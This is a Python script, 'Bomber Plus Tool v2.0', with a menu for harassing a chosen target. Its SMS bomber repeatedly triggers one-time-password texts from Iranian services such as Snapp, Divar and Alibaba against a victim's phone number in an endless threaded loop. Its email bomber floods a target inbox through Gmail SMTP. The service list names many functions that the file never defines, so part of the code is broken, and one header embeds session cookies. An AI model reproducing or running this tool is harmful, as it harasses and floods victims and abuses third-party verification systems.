from platform import node, system, release; Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import smtplib
from email.mime.text import MIMEText
import random
import sys
import socket

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  # Red
g = '\033[32;1m'  # Green
y = '\033[33;1m'  # Yellow
b = '\033[34;1m'  # Blue
p = '\033[35;1m'  # Purple
w = '\033[37;1m'  # White
a = '\033[0m'     # Reset
d = '\033[90;1m'  # Dark Gray

# Slow print function
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Progress bar function (for email only)
def progress_bar(progress, total, width=30):
    percent = int((progress / total) * 100)
    filled = int(width * progress // total)
    bar = f"{g}█{a}" * filled + f"{r}-{a}" * (width - filled)
    sys.stdout.write(f"\r{p}[Progress] {y}{percent}% {w}[{bar}]")
    sys.stdout.flush()

# Check internet connectivity
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# Random email messages list
random_messages = [
    "Hello! This is a test message from the Hacker group. Hope you're having a great day!",
    "Hey there! Just dropping by to say hi from our tool.",
    "This is an automated message to test our system. Please ignore it!",
    "Hi friend, this is a random message to check your email.",
    "Good news! Our tool is working, and this message is proof.",
]

# Email sending function (no debug logs)
def send_email(target_email, sender_email, sender_password, smtp_server="smtp.gmail.com", smtp_port=587, retries=3):
    for attempt in range(retries):
        try:
            body = random.choice(random_messages)
            msg = MIMEText(body)
            msg['Subject'] = f"Test Message #{random.randint(1, 1000)}"
            msg['From'] = f"Hacker group <{sender_email}>"
            msg['To'] = target_email
            msg['Reply-To'] = sender_email
            msg['X-Priority'] = '3'
            msg['X-Mailer'] = 'Hacker Mailer v2.0'
            
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            server.set_debuglevel(0)  # Disable debug logs
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, target_email, msg.as_string())
            server.quit()
            return True
        except Exception as e:
            if attempt < retries - 1:
                sleep(2)
            else:
                print(f"{r}[Email Error] {a}Failed after {retries} attempts: {e}")
                return False

# Email bomber function with progress bar and menu return
def email_bomber(target_email, sender_email, sender_password, count, delay):
    if not check_internet():
        print_slow(f"{r}[-] {y}No internet connection! Please check your network and try again.")
        sleep(2)
        return
    
    print_slow(f"{p}╔═════[ Email Bombing Initiated ]═════╗")
    print_slow(f"{g}Target Locked: {y}{target_email}")
    print_slow(f"{g}Payloads: {y}{count} emails")
    print_slow(f"{g}Delay: {y}{delay}s")
    print_slow(f"{p}╚═════════════════════════════════════╝")
    sleep(1)

    for i in range(count):
        try:
            Thread(target=send_email, args=(target_email, sender_email, sender_password)).start()
            progress_bar(i + 1, count)
            sys.stdout.write(f" {b}[+] {y}Payload {i+1}/{count} Deployed!\n")
            sys.stdout.flush()
            sleep(delay)
        except KeyboardInterrupt:
            print_slow(f"{r}[-] {y}Bombing Terminated by User!")
            break
    
    print_slow(f"{g}[+] {y}Mission Completed!")
    sleep(1)  # Brief pause before clearing
    system('clear' if name == 'posix' else 'cls')  # Clear screen before returning

# SMS sending functions (placeholders)
def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {a}Code Was Sent')
            return True #snapp
    except:
        pass

def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {a}Code Was Sent')
            return True #gap     
    except:
        pass


def divar(phone):
    divarH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
'referer': 'https://divar.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-standard-divar-error': 'true'}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {a}Code Was Sent')
            return True #divar api
    except:
        pass
    


def alibaba(phone):
    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {a}Code Was Sent')
            return True
    except:
        pass


def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meH = {
"Accept": "application/json",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"Content-Type": "application/json",
"Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0",
"Host": "www.hamrah-mechanic.com",
"Origin": "https://www.hamrah-mechanic.com",
"Referer": "https://www.hamrah-mechanic.com/membersignin/",
"Source": "web",
"TE": "trailers",
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
}
    meD = {
	"landingPageUrl": "https://www.hamrah-mechanic.com/",
	"orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
	"phoneNumber": "0"+phone.split("+98")[1],
	"prevDomainUrl": None,
	"prevUrl": None,
	"referrer": "https://www.google.com/"
}
    try:
        meR = post(url=meU, headers=meH, data=meD).json()
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {a}Code Was Sent')
            return True
    except: 
        pass

# Simple VIP function for SMS bombing
def Vip(phone, Time):
    services = [
        snap, gap, tap30, divar, torob, snapfood, sheypoor, okorosh, alibaba, smarket,
        gapfilm, sTrip, filmnet, drdr, itool, anar, azki, nobat, chmdon, bn,
        lendo, olgoo, pakhsh, didnegar, baskol, kilid, basalam, see5, ghabzino,
        simkhanF, simkhanT, drsaina, binjo, limome, bimito, bimitoVip, seebirani,
        mihanpezeshk, mek
    ]
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target Locked: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    running = True  # Flag to control threads
    try:
        # Infinite loop for continuous bombing
        while running:
            for service in services:
                if not running:  # Check flag to stop immediately
                    break
                try:
                    Thread(target=service, args=[phone]).start()
                    sleep(Time)
                except Exception as e:
                    print(f"{r}[-] {a}Error in {service.__name__}: {e}")
    except KeyboardInterrupt:
        running = False  # Signal threads to stop
        print_slow(f"{g}[+] {y}Mission Completed!")
        system('clear' if name == 'posix' else 'cls')  # Clear screen before returning
        return  # Exit function and return to menuu

# Phone number validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# List of small random bomb ASCII arts
bomb_ascii_arts = [
    # Bomb 1
    f"""
{r}     ______________________________  {y} \  | /  .
{r}    /                            / \ {y} \ \ / /
{r}   |                            |{w}=========={y}-  - -
{r}    \____________________________\_/  {y}/ / \ \ 
{y}                                    .  / | \  .
    """,
    # Bomb 2
    f"""
               {b}    ____
               {b}   '-..-'           {r} .-.
               {b}  ___||___       {r} .-/ /-.
               {b} /_______/|   {r}   / / / /
               {b} |       ||   {r}  / / / /
               {b} |   o   |/   {r} / / / / 
                {b}'----`(--'{w}---{r}/>>=< /
    """,
    # Bomb 3
    f"""
{y}                 _.-^^---....,,--       
               _--                  --_  
              <                        >)
              |                         | 
               \._                   _./  
                  ```--. . , ; .--'''       
                        | |   |             
                     .-=||  | |=-.   
                     `-=#$%&%$#=-'   
                        | ;  :|     
               _____.,-#%&$@%#&#~,._____
    """,
    # Bomb 4
    """
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠤⣀⠀⢠⡀⣿⣰⢀⣠⠴⠋⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣙⣳⣿⣿⣿⣿⣅⣀⡀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⣄⣤⣄⣠⣶⣿⡭⣙⣷⣿⣿⣿⣯⡉⠉⠁
                ⠀⠀⠀⠀⢀⣤⡶⠚⣿⣿⢡⣷⡻⣿⡺⡿⣻⣄⠀⣰⠟⢹⡟⣿⠀⠉⠀⠀
                ⠀⠀⢀⡴⠛⠙⣶⣾⣿⣿⡘⢿⣿⣷⣯⣟⣛⡟⠰⠁⠀⢸⡇⠘⡆⠀⠀⠀
                ⠀⢠⠏⠀⠀⣰⣿⣿⣿⣿⣿⣶⣍⣛⠻⠿⠟⣼⡆⠀⠀⢸⠃⠀⠀⠀⠀⠀
                ⠀⣿⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠘⠂⠀⠀⠀⠀⠀
                ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
                ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
                ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
]

# Main menu with random bomb ASCII art
def main_menu():
    system('clear' if name == 'posix' else 'cls')
    random_bomb = random.choice(bomb_ascii_arts)  # Pick a random bomb
    print_slow(f"""
    {random_bomb}
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool v2.0 ⟭             ║
{p}╚════════════════════════════════════════════════════╝
{y} Info:
    {g}» Coder: {w}@Amirprx3
    {g}» Channel: {w}@Hacker_Plus_main
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    choice = input(f"{g}[?] {y}Enter Your Choice (0-2): {a}")
    return choice

# Main execution
def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone Number!")
            try:
                Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Default=0.1] {r}- {a}') or 0.1)
            except ValueError:
                Time = 0.1
                print(f"{g}[0.1] {a}Used")
            print_slow(f"{g}[+] {y}SMS Bomber Running... Press Ctrl+C to Stop!")
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Initializing Email Bomber!")
            target_email = input(f"{g}[?] {y}Enter Target Email: {a}")
            sender_email = input(f"{g}[?] {y}Enter Your Email: {a}")
            sender_password = input(f"{g}[?] {y}Enter Your Email App Password: {a}")
            try:
                count = int(input(f"{g}[?] {y}Enter Number of Emails [Default=10]: {a}") or 10)
                delay = float(input(f"{g}[?] {y}Enter Delay Between Emails (seconds) [Default=1.0]: {a}") or 1.0)
            except ValueError:
                count, delay = 10, 1.0
                print(f"{g}[Default] {a}Using 10 emails with 1.0s delay")
            email_bomber(target_email, sender_email, sender_password, count, delay)

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice! Please select 0, 1, or 2.")
            sleep(1)

if __name__ == "__main__":
    main()
